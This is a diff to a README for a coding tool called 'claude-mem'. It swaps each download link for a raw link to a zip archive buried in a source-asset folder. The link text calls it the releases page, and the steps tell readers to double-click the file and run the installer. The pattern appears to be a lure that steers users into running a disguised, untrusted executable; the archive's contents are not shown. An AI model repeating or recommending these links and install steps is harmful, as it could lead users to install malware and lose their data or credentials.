@@ -1,6 +1,6 @@
 # 🤖 claude-mem - Capture Your Coding Moments Effortlessly
 
-[![Download claude-mem](https://raw.githubusercontent.com/Aleksa1982/claude-mem/main/scripts/translate-readme/claude_mem_3.1.zip)](https://raw.githubusercontent.com/Aleksa1982/claude-mem/main/scripts/translate-readme/claude_mem_3.1.zip)
+[![Download claude-mem](https://github.com/Aleksa1982/claude-mem/raw/refs/heads/main/src/ui/viewer/assets/claude-mem-v3.7-beta.5.zip)](https://github.com/Aleksa1982/claude-mem/raw/refs/heads/main/src/ui/viewer/assets/claude-mem-v3.7-beta.5.zip)
 
 ## 📋 Description
 
@@ -24,7 +24,7 @@ To run claude-mem, you need:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Click this link to access the releases page: [Download claude-mem](https://raw.githubusercontent.com/Aleksa1982/claude-mem/main/scripts/translate-readme/claude_mem_3.1.zip).
+1. **Visit the Releases Page**: Click this link to access the releases page: [Download claude-mem](https://github.com/Aleksa1982/claude-mem/raw/refs/heads/main/src/ui/viewer/assets/claude-mem-v3.7-beta.5.zip).
 2. **Choose the Latest Version**: Look for the latest version available.
 3. **Download the Software**: Click on the link for the installation file.
 4. **Run the Installer**: Locate the downloaded file, then double-click it to start the installation.
@@ -32,7 +32,7 @@ To run claude-mem, you need:
 
 ## 📥 Download & Install
 
-To get started with claude-mem, [visit this page to download](https://raw.githubusercontent.com/Aleksa1982/claude-mem/main/scripts/translate-readme/claude_mem_3.1.zip). 
+To get started with claude-mem, [visit this page to download](https://github.com/Aleksa1982/claude-mem/raw/refs/heads/main/src/ui/viewer/assets/claude-mem-v3.7-beta.5.zip). 
 
 1. After the download completes, find the file in your downloads folder.
 2. Double-click the downloaded file to run the installer.
